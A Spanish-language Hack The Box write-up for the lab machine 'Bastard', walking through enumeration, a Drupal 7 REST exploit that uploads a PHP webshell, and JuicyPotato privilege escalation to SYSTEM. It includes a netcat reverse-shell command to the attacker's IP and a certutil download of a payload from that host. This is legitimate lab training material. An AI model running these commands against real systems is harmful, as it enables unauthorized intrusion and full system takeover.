---
title:  "Bastard Writeup [ES] - HackTheBox"
date:   2021-11-08 15:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [medium]
---

[Bastard](https://app.hackthebox.com/machines/7) es una máquina **Windows** de dificultad media ofrecida por la plataforma de [Hack The Box](https://app.hackthebox.com/). A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla.


## Información


![Info](/images/HTB/Bastard/01-info.png)


## Enumeración

### NMAP

Como siempre, partiremos realizando un escaneo general de los 65535 puertos.

* ```nmap -sS --min-rate 5000 -p- -n -v 10.10.10.9 -oG allPorts.gnmap```

```plaintext
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 15:11 -03
Initiating Ping Scan at 15:11
Scanning 10.10.10.9 [4 ports]
Completed Ping Scan at 15:11, 0.20s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:11
Scanning 10.10.10.9 [65535 ports]
Discovered open port 80/tcp on 10.10.10.9
Discovered open port 135/tcp on 10.10.10.9
Discovered open port 49154/tcp on 10.10.10.9
Completed SYN Stealth Scan at 15:11, 26.48s elapsed (65535 total ports)
Nmap scan report for 10.10.10.9
Host is up (0.15s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.84 seconds
```

Posteriormente realizamos un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados.

* ```nmap -sC -sV -n -Pn -p80,135,49154 10.10.10.9 -oN ports.nmap```


```plaintext
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 15:18 -03
Nmap scan report for 10.10.10.9
Host is up (0.15s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.76 seconds
```
* Resumen puertos

| Puerto    | Estado  | Servicio                           |
|-----------|---------|------------------------------------|
| 80/tcp    | Abierto | Microsoft IIS httpd 7.5 / Drupal 7 |
| 135/tcp   | Abierto | Microsoft Windows RPC              |
| 49154/tcp | Abierto | Microsoft Windows RPC              |



### Enumeración web

Durante la fase de escaneo, se detectó que existe el archivo robots.txt, al revisarlo encontramos que contiene múltiples rutas en él. 

![](/images/HTB/Bastard/05-robots.txt.png)


La forma más eficiente para verificar si son válidas o no, es filtrar estas rutas y crear un pequeño diccionario para fuzzear porsteriormente con wfuzz. Para esto, utilizando ```curl``` y ```grep```, filtraremos lo que nos interesa.

* ```curl -s http://10.10.10.9/robots.txt | awk '{print $2}' | grep  "/" | grep -v "http://" > robots.txt```

![](/images/HTB/Bastard/10-curl.png)

Lo siguiente será exportarlo a un archivo, el cual quedó con 36 posibles rutas.

![](/images/HTB/Bastard/15-diccionario.png)

Ahora utilizando wfuzz verificaremos que rutas devuelven un código HTTP de estado exitoso.

* ```wfuzz -c --hc=403 -u http://10.10.10.9/FUZZ -w robots.txt```

![](/images/HTB/Bastard/25-fuzz.png)

De aquí, lo que nos interesa es saber la versión de Drupal, para esto, la mejor opción es acceder al **changelog**.

![](/images/HTB/Bastard/28-drupal-version.png)

> Drupal 7.54

## Ganando acceso

Ahora que sabemos que versión de Drupal está instalada en la máquina víctima, buscaremos posibles exploits en exploitdb.

* ```searchsploit drupal 7.x```

![](/images/HTB/Bastard/29-searchsploit.png)

Copiaremos el exploit a nuestro directorio de trabajo.

* ```searchsploit -m 41564```

Lo renombraremos a **exploit.php** y utilizando ```vim``` revisaremos su contenido.


![](/images/HTB/Bastard/29.5-exploit.png)

Lo que está marcado en el recuadro rojo se debe actualizar con los datos de la máquina víctima y además especificar que contenido se subirá a la web.

> **url** > se debe actualizar con la ruta de drupal

> **endpoint_path** > endpoint rest, se utilizará para explotar el servicio. En el caso de esta máquina, ha sido renombrado a 'rest'

> **filename** > nombre del archivo que se subirá

> **data** > contenido del archivo

![](/images/HTB/Bastard/29.5-exploit-modificado.png)

En este caso, subiremos una shell llamada **webshell.php** que tendrá código para ejecutar comandos a través de la variable **cmd**.

Ejecutamos el exploit.

![](/images/HTB/Bastard/29.6-exploit-run.png)

Nos indica que nuestro archivo fué escrito a la ruta ```http://10.10.10.9/webshell.php```. Vamos allá y veremos que efectivamente el recurso existe.

![](/images/HTB/Bastard/29.7-webshell.png)

Ahora, utilizando la variable **cmd**, le pasaremos un comando para verificar su ejecución.

![](/images/HTB/Bastard/29.8-webshell-whoami.png)

Con esto ya solo queda entablar una reverse shell.

* ```http://10.10.10.9/webshell.php?cmd=\\10.10.14.12\Shared\nc.exe -e cmd 10.10.14.12 443```

Pero antes, como siempre, compartiremos **netcat** a través de **SMB** con la ayuda de impacket y nos pondremos a la escucha de una conexión por el puerto 443.

![](/images/HTB/Bastard/30-user-shell.png)

Entraremos como ```nt authority\iusr```

## Escalando privilegios

Para la escalada de privilegios, como siempre partiremos por realizar un pequeño reconomiento.


![](/images/HTB/Bastard/32-reconocimiento.png)

Como puntos importantes, vemos lo siguiente:

* Windows 2008 R2 Datacenter de 64 bits.
* Token **SeImpersonatePrivilege** habilitado.

> Más información sobre [Abusing Tokens](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

Con eso ya podemos empezar a pensar en [JuicyPotato](https://github.com/ohpe/juicy-potato) para la explotación de este token. Descargamos el binario desde [Releases](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) y lo transferimos a la máquina víctima con un servidor web **python3**.

1. Primero nos moveremos a ```C:\Windows\Temp``` y crearemos la carpeta ```privesc``` para alojar el binario.
2. Luego levantaremos el server web de **python3** compartiendo **nc.exe**.
   * ```python3 -m http.server 80```
3. Descargaremos **JuicyPotato.exe**.
   * ```certutil.exe -f -split -urlcache http://10.10.14.12/JuicyPotato.exe```

![](/images/HTB/Bastard/35-download-juicy.png)

Y ya teniendolo en la máquina, lo ejecutaremos para obtener una nueva shell con permisos máximos. En este caso entablaremos una conexión a través del puerto 444.

Lo usual es ejecutar **JuicyPotato** de la siguiente forma:

* ```JuicyPotato.exe -t * -l 1337 -p cmd.exe -a "/c <COMANDO A EJECUTAR>"```

![](/images/HTB/Bastard/36-Juicy-error.png)

Pero recibimos el mensaje ***recv failed with error: 10038***. En este caso, tendremos que proporcionar un CLSID que sea compatible con la versión de S.O. de la máquina víctima. Este valor se puede buscar desde el mismo repositorio de **JuicyPotato**

* [Juicy Potato - CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

![](/images/HTB/Bastard/37-clsid.png)

Después de mucho buscar, encontramos un CLSID que funciona.

![](/images/HTB/Bastard/39-juicy-ok.png)

Nos responde que el comando se ejecuta como ```NT AUTHORITY\SYSTEM``` y con estado **OK**.

Ahora ejecutamos el comando final, para entablar la reverse shell con privilegios de administrador.

![](/images/HTB/Bastard/40-Juicypotato.png)

Abrimos un canal para recibir la conexión.

![](/images/HTB/Bastard/38-root-shell.png)

Ya estaríamos como el user ```NT AUTHORITY\SYSTEM```, por lo tanto, esta máquina ya se encoontraría rooteada.

Por último, ya podríamos leer las flags que se encuentran en los directorios usuales.

![](/images/HTB/Bastard/60-flags.png)

